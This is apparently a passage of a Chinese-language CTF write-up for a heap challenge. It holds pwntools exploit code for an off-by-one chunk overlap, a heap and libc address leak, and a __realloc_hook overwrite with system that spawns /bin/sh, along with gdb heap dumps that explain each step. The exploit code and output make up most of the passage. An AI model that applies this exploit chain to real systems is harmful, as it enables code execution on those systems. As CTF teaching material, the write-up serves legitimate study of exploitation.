        payload += p64(heap_base+0x290)
        payload += p64(0x20)
        payload += p64(heap_base+0x3b0)
        payload += p64(0)*4+p64(0x21)
        payload += p64(0)*3
        PUT("c"*0x8, 0x78, payload)
        payload = p64(0)+p64(0x41)
        payload += p64(heap_base+0x90)
        payload += p64(0x8)+p64(heap_base+0x230)
        payload += p64(0)*2+p64(heap_base+0x250)
        payload += p64(0x1)+p64(0)*3
        PUT("d"*0x8, 0x60, payload)
        gdb.attach(p)
        system_addr = libc_base+system_off
        print("system_addr: 0x%x" % system_addr)
        payload = 'a'*0x3
        payload += p64(system_addr)
        payload += p8(0)*(0x4d+0x8)
        PUT("e"*0x8, 0x60, payload)
        payload = "/bin/sh"
        payload += p8(0)*0x12 
        GET(payload)
    if __name__ == '__main__':
        exp()
        p.interactive()
### 细节讲解
我只有exp部分是重点，其余创建堆块动作都是辅助的
#### 堆块重叠
[堆叠](http://4ngelboy.blogspot.com/2016/10/span-display-block-overflow-hidden_10.html)  
这篇文章讲的很好，图配的也很好，看下这部分就大概知道堆块重叠了  
而这道题中，这里就是构造堆块重叠部分
    libc = ELF('libc.so.6')
        system_off = libc.symbols['system']
        realloc_hook_off = libc.symbols['__realloc_hook']
        DEL("th3fl4g")
        PUT("1"*0x8, 0x80, 'A'*0x80)
        PUT("2"*0x8, 0x18, 'B'*0x18)
        PUT("3"*0x8, 0x60, 'C'*0x60)
        PUT("3"*0x8, 0xf0, 'C'*0xf0)
        PUT("4"*0x8+p64(0)+p64(0x200), 0x20, 'D'*0x20)  # off by one
        DEL("1"*0x8)
        DEL("3"*0x8)
#### 泄露地址
    PUT("a", 0x88, p8(0)*0x88)
        DUMP()
        p.recvuntil("INFO: Dumping all rows.\n")
        temp = p.recv(11)
        heap_base = u64(p.recv(6).ljust(8, "\x00"))-0x3f0
        libc_base = int(p.recvline()[3:-7])-0x3be7b8
        log.info("heap_base: " + hex(heap_base))
        log.info("libc_base: " + hex(libc_base))
        realloc_hook_addr = libc_base + realloc_hook_off
        log.info("reallo_hook: 0x%x" % realloc_hook_addr)
第一步put是为了将free掉的chunk移动到2处，这样才好泄露
    gdb-peda$ x/50gx 0x562a3c9a8070-0x70
    0x562a3c9a8000: 0x0000000000000000  0x0000000000000041
    0x562a3c9a8010: 0x0000000000000000  0x0000000000000080
    0x562a3c9a8020: 0x0000562a3c9a80b0  0x0000000000000000
    0x562a3c9a8030: 0x0000000000000000  0x0000562a3c9a8140
    0x562a3c9a8040: 0x0000000000000000  0x0000000000000021
    0x562a3c9a8050: 0x4242424242424242  0x4242424242424242
    0x562a3c9a8060: 0x4242424242424242  0x0000000000000021
    0x562a3c9a8070: 0x3232323232323232  0x0000000000000000
    0x562a3c9a8080: 0x0000000000000000  0x0000000000000021
    0x562a3c9a8090: 0x0000000000000000  0x0000000000000000
    0x562a3c9a80a0: 0x0000000000000000  0x0000000000000301 #free后合并的chunk
    0x562a3c9a80b0: 0x00007f14e88247b8  0x00007f14e88247b8
    0x562a3c9a80c0: 0x4141414141414141  0x4141414141414141
    0x562a3c9a80d0: 0x4141414141414141  0x4141414141414141
    0x562a3c9a80e0: 0x4141414141414141  0x4141414141414141
    0x562a3c9a80f0: 0x4141414141414141  0x4141414141414141
    0x562a3c9a8100: 0x4141414141414141  0x4141414141414141
    0x562a3c9a8110: 0x4141414141414141  0x4141414141414141
    0x562a3c9a8120: 0x4141414141414141  0x4141414141414141
    0x562a3c9a8130: 0x0000000000000090  0x0000000000000040 #堆块2
    0x562a3c9a8140: 0x0000562a3c9a8070  0x0000000000000018
    0x562a3c9a8150: 0x0000562a3c9a8050  0x0000000000000000
    0x562a3c9a8160: 0x0000000000000000  0x0000562a3c9a8250
    0x562a3c9a8170: 0x0000000000000001  0x0000000000000041
    0x562a3c9a8180: 0x0000562a3c9a8000  0x00000000000000f0
  1. 为什么确定这里是堆块2，你可以看他的key指针，指向0x0000562a3c9a8070，这里正是0x32就是第二块
  2. 如果我们要泄露的话，就是通过覆盖堆块的数据部分的大小，也就是0x18那个大小，覆盖成0x562a3c9a80b0处存的地址，我们要将这个内容往下偏移多少要计算下
  3. 0x562a3c9a8140-0x562a3c9a80b0=0x90
  4. 所以我们下一个malloc的大小就是0x80-0x90之间了,不能是0x90，否则会变成0x100的chunk
覆盖后结果如下，地址会变，因为我是两次调试，方便截图，实际偏移位置没变
    gdb-peda$ x/50gx 0x55be33916070-0x70
    0x55be33916000: 0x0000000000000000  0x0000000000000041
    0x55be33916010: 0x0000000000000000  0x0000000000000080
    0x55be33916020: 0x000055be339160b0  0x0000000000000000
    0x55be33916030: 0x0000000000000000  0x000055be33916140
    0x55be33916040: 0x0000000000000000  0x0000000000000021
    0x55be33916050: 0x4242424242424242  0x4242424242424242
    0x55be33916060: 0x4242424242424242  0x0000000000000021
    0x55be33916070: 0x3232323232323232  0x0000000000000000
    0x55be33916080: 0x0000000000000000  0x0000000000000021
    0x55be33916090: 0x0000000000000000  0x0000000000000000
    0x55be339160a0: 0x0000000000000000  0x0000000000000091
    0x55be339160b0: 0x0000000000000000  0x0000000000000000
    0x55be339160c0: 0x0000000000000000  0x0000000000000000
    0x55be339160d0: 0x0000000000000000  0x0000000000000000
    0x55be339160e0: 0x0000000000000000  0x0000000000000000
    0x55be339160f0: 0x0000000000000000  0x0000000000000000
    0x55be33916100: 0x0000000000000000  0x0000000000000000
    0x55be33916110: 0x0000000000000000  0x0000000000000000
    0x55be33916120: 0x0000000000000000  0x0000000000000000
    0x55be33916130: 0x0000000000000000  0x0000000000000271
    0x55be33916140: 0x00007fa9f416c7b8  0x00007fa9f416c7b8 #覆盖了原来的0x18
    0x55be33916150: 0x000055be33916050  0x0000000000000000
    0x55be33916160: 0x0000000000000000  0x000055be33916250
    0x55be33916170: 0x0000000000000001  0x0000000000000041
    0x55be33916180: 0x000055be339163e0  0x0000000000000088
#### 保护现场
这步是比较难的，因为堆块申请的位置不确定，需要一步步调试确定，我建议每部署一部分，调试一次状况，然后在进行现场的保护
    payload = p64(heap_base+0x70)
        payload += p64(0x8)
        payload += p64(heap_base+0x50)
        payload += p64(0)*2
        payload += p64(heap_base+0x250)
        payload += p64(0)+p64(0x41)
        payload += p64(heap_base+0x3e0)
        payload += p64(0x88)
        payload += p64(heap_base+0xb0)
        payload += p64(0)*2
        payload += p64(heap_base+0x250)
        payload += p64(0)*5+p64(0x71)
        payload += p64(realloc_hook_addr-0x8-0x3-0x8)
        PUT("6"*0x8, 0xa8, payload)
        #1
        payload = p64(0)*3+p64(0x41)
        payload += p64(heap_base+0x290)
        payload += p64(0x20)
        payload += p64(heap_base+0x3b0)
        payload += p64(0)*4+p64(0x21)
        payload += p64(0)*3
        PUT("c"*0x8, 0x78, payload)
        #2
        payload = p64(0)+p64(0x41)
        payload += p64(heap_base+0x90)
        payload += p64(0x8)+p64(heap_base+0x230)
        payload += p64(0)*2+p64(heap_base+0x250)
        payload += p64(0x1)+p64(0)*3
        PUT("d"*0x8, 0x60, payload)
        #3
具体我怎么调试示范下，先在1处gdb.attach(p)
    gdb-peda$ x/100gx 0x559717162000
    0x559717162000: 0x0000000000000000  0x0000000000000041 #结构体chunk
    0x559717162010: 0x00005597171621c0  0x00000000000000a8
    0x559717162020: 0x0000559717162140  0x0000000000000000
    0x559717162030: 0x0000000000000000  0x0000559717162140
    0x559717162040: 0x0000000000000001  0x0000000000000021
    0x559717162050: 0x4242424242424242  0x4242424242424242
    0x559717162060: 0x4242424242424242  0x0000000000000021
    0x559717162070: 0x3232323232323232  0x0000000000000000
    0x559717162080: 0x0000000000000000  0x0000000000000021
    0x559717162090: 0x0000000000000000  0x0000000000000000
    0x5597171620a0: 0x0000000000000000  0x0000000000000091
    0x5597171620b0: 0x0000000000000000  0x0000000000000000
    0x5597171620c0: 0x0000000000000000  0x0000000000000000